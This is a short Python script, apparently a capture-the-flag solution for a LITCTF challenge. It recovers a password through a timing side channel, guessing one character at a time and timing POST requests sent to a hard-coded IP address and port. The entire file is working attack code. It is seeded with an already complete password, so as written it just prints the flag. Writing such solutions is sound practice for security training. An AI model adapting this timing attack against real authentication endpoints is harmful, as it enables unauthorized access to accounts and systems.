#!/usr/bin/env python3
import requests
import string
import time

def bruteforce(password=''):
    if len(password) < 7:
        for c in string.printable:
            data = {'password': (password + c).ljust(7, '?')}

            start_time = time.time()
            response = requests.post('http://34.31.154.223:59098/', data=data)

            if time.time() - start_time > 1 + len(password):
                password += c
                break

        bruteforce(password)
    else:
        print(f'LITCTF{{{password}}}')

bruteforce('kBySlaY')
